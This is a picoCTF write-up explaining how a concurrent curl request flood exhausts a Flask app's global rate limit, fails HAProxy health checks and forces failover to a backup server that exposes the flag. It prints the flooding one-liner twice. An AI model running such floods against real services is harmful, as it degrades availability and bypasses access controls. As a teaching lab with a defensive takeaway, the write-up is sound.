---
title: "Failure Failure"
description: "picoCTF Failure Failure writeup exploiting HAProxy failover behavior by exhausting rate limits to trigger backend routing to the flag server."
category: "picoCTF - General Skills"
tags: ["picoctf", "general-skills"]
published: true
---
# Failure Failure

## Challenge

**Category:** General Skills  
**Name:** Failure Failure

**Prompt:**

> Welcome to Failure Failure — a high-available system.
> This challenge simulates a real-world failover scenario where one server is prioritized over the other.
> A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
> You can begin your journey here to try and retrieve the flag.
>
> For reference:
> The HAProxy configuration used in this challenge is available here.
> The application code is available here

## Goal

Force the load balancer off the primary server and onto the backup server, because the backup server is the one that contains the flag.

## Step 1: Read the application code

The provided Flask app:

```python
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

def global_rate_limit_key():
    return "global"

limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

Important details:

1. The rate limit is **global**
2. The key function always returns `"global"`
3. So every request counts against the same bucket
4. When the limit is exceeded, the app returns `503`
5. The flag is shown only when `IS_BACKUP=yes`

That means:

- the primary server likely returns `"No flag in this service"`
- the backup server likely returns the real flag

## Step 2: Read the HAProxy configuration

Provided config:

```haproxy
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

Important details:

1. `s1` is the normal primary backend
2. `s2` is marked `backup`
3. HAProxy health-checks `/`
4. HAProxy expects HTTP status `200`
5. If a backend starts returning non-`200`, it can be marked down

This is the full intended path:

- flood the primary
- trigger its global limit
- it starts returning `503`
- HAProxy health checks fail
- HAProxy marks `s1` down
- traffic fails over to backup `s2`
- `s2` returns the flag

## Step 3: Confirm normal behavior

Request the page normally:

```bash
curl -i -s http://mysterious-sea.picoctf.net:53064/
```

Observed response body:

```html
<p>No flag in this service</p>
```

So the live traffic was initially going to the primary.

## Step 4: Trigger failover by exhausting the primary

The rate limit is `300 per minute`, so send more than that quickly.

A fast concurrent burst worked:

```bash
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
```

What this does:

- `seq 1 360` generates 360 requests
- `xargs -P60` runs many requests in parallel
- `curl -s -o /dev/null` sends the traffic without printing page bodies
- `sleep 5` gives HAProxy a moment to register health-check failures
- the final `curl` fetches the page after failover

## Step 5: Read the flag from the backup server

After the burst, the final request returned:

```html
<p>picoCTF{<redacted>}</p>
```

## Flag

```text
picoCTF{<redacted>}
```

## Why this works

This is an availability-design bug:

- the app uses a global rate limit
- HAProxy health-checks the exact same route
- health checks require status `200`
- the limit exhaustion makes the primary look unhealthy

So normal user traffic can influence load balancer health state.

The mistake is that:

- the primary and backup expose different data
- and the balancer’s failover condition is externally triggerable

That lets an attacker force routing to the backup.

## Minimal solve path

```bash
curl -s http://mysterious-sea.picoctf.net:53064/
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
```

## Takeaway

Health-check endpoints should not share fragile state with user traffic, especially not global rate limits. If production routing decisions depend on a route that attackers can intentionally degrade, failover can become an access-control bypass.
